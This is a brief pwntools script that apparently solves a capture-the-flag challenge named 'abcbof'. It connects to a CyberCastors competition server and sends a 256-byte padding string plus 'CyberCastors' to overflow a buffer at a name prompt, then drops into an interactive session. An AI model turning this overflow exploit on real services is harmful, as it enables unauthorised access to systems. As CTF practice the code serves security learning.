from pwn import *

#context(log_level = "debug")

#p=process('./abcbof')
p=remote('chals20.cybercastors.com', 14424)

#gdb.attach(p, "b *0x4007c4")
#raw_input()
payload ='a'*256
payload += 'CyberCastors'

p.recvuntil('Hello everyone, say your name: ')
p.sendline(payload)

p.interactive()

